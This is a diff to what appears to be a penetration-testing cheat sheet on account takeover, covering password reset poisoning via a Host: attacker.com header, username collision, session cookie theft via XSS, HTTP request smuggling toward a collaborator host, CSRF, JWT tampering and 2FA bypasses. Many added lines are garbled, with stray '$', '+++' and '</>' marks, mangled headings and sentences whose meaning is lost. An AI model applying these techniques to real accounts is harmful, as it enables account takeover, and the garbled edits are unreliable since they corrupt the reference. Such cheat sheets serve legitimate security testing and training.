@@ -38,9 +38,10 @@
 3. Don't change password
 4. Click any 3rd party websites(eg: Facebook, twitter)
 5. Intercept the request in Burp Suite proxy
-6. Check if the referer header is leaking password reset token.
+6. Check to see if the referrer header is leaking password reset token.
 
-### Account Takeover Through Password Reset Poisoning
+### Account Takeover
+$ -psswd -Reset -Poison
 
 1. Intercept the password reset request in Burp Suite
 2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
@@ -77,7 +78,7 @@ email=victim@mail.com|hacker@mail.com
 
 1. Attacker logs-in with their account and goes to the **Change password** feature.
 2. Start the Burp Suite and Intercept the request
-3. Send it to the repeater tab and edits the parameters : User ID/email
+3. Send it to the Repeater Tab and edit the parameter: 'User ID/email'
     ```powershell
     POST /api/changepass
     [...]
@@ -86,8 +87,9 @@ email=victim@mail.com|hacker@mail.com
 
 ### Weak Password Reset Token
 
-The password reset token should be randomly generated and unique every time.
-Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.
++The password reset token should be randomly generated and unique every time.
++Determine if a public token expired. 
++If equal, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm...
 
 * Timestamp
 * UserID
@@ -108,26 +110,26 @@ Try to determine if the token expire or if it's always the same, in some cases t
 2. Inspect the server response and check for `resetToken`
 3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`
 
-### Password Reset Via Username Collision
+### Username Collision
 
 1. Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
 2. Request a password reset with your malicious username.
 3. Use the token sent to your email and reset the victim password.
 4. Connect to the victim account with the new password.
 
-The platform CTFd was vulnerable to this attack. 
++++The platform CTFd was vulnerable to this attack. 
 See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
 
-## Account Takeover Via Cross Site Scripting
+## Cross-Site Scripting
 
-1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
-2. Leak the current **sessions cookie**
-3. Authenticate as the user using the cookie
+1. Find an XSS. Inside, an app or subdomain cookies are scoped to a parent domain : `*.domain.com`
+2. Leak a current **session cookie**
+3. Authenticate user using the cookie
 
-## Account Takeover Via HTTP Request Smuggling
+## HTTP Request Smuggling
 
-Refer to **HTTP Request Smuggling** vulnerability page.
-1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
+___Refer to **HTTP Request Smuggling** vulnerability page.
+1. Use **smuggler** to detect a type of HTTP://www.Request_Smuggling\(CL, TE, CL.TE).mod
     ```powershell
     git clone https://github.com/defparam/smuggler.git
     cd smuggler
@@ -135,61 +137,52 @@ Refer to **HTTP Request Smuggling** vulnerability page.
     ```
 2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
     ```powershell
-    GET http://something.burpcollaborator.net  HTTP/1.1
+    [GET] http://something.burpcollaborator.net  HTTP/1.1
     X: 
     ```
 3. Final request could look like the following
     ```powershell
-    GET /  HTTP/1.1
+    [GET] /  HTTP/1.1
     Transfer-Encoding: chunked
     Host: something.com
     User-Agent: Smuggler/v1.0
     Content-Length: 83
-
-    0
-
-    GET http://something.burpcollaborator.net  HTTP/1.1
+$
+$    0
+$
+$   [GET] http://something.burpcollaborator.net  HTTP/1.1
     X: X
     ```
-    
-Hackerone reports exploiting this bug
+</>    
+-_Hackerone reports exploiting this bug
 * https://hackerone.com/reports/737140
 * https://hackerone.com/reports/771666
+</>
+## Cross-Site+Request0Forgery*(CSRF)
+==/=
+1. "HTML form with auto-submit for a password change..."
+2. Send.
 
-## Account Takeover via CSRF
-
-1. Create a payload for the CSRF, e.g: "HTML form with auto submit for a password change"
-2. Send the payload
-
-## Account Takeover via JWT
-
-JSON Web Token might be used to authenticate an user. 
-
+## Json-Web_token (JWT)&JSON Web Token might be used to authenticate an user. 
 * Edit the JWT with another User ID / Email
 * Check for weak JWT signature 
-
 ## 2FA Bypasses
-
 ### Response Manipulation
 
-In response if `"success":false`
-Change it to `"success":true`
+$ if `"success":false`
+$`"success":true`
 
 ### Status Code Manipulation
-
-If Status Code is **4xx**
-Try to change it to **200 OK** and see if it bypass restrictions
+$ If Status_Code**4xx**
+$ **200 OK**
 
 ### 2FA Code Leakage in Response
-
 Check the response of the 2FA Code Triggering Request to see if the code is leaked.
 
 ### JS File Analysis
-
-Rare but some JS Files may contain info about the 2FA Code, worth giving a shot
+Rare JS Files. May contain info about the 2FA_Code.
 
 ### 2FA Code Reusability
-
 Same code can be reused
 
 ### Lack of Brute-Force Protection
@@ -213,7 +206,7 @@ No CSRF Protection on disabling 2FA, also there is no auth confirmation
 Bypassing 2FA by abusing the Backup code feature
 Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions
 
-### Clickjacking on 2FA Disabling Page
+### Click-jacking on 2FA Disabling Page
 
 Iframing the 2FA Disabling page and social engineering victim to disable the 2FA
 
@@ -224,13 +217,10 @@ If the session is already hijacked and there is a session timeout vuln
 ### Bypass 2FA with null or 000000
 Enter the code **000000** or **null** to bypass 2FA protection.
 
-
-## TODO
-
+## TODO:
 * Broken cryptography
 * Session hijacking
 * OAuth misconfiguration
-
 
 ## References
 
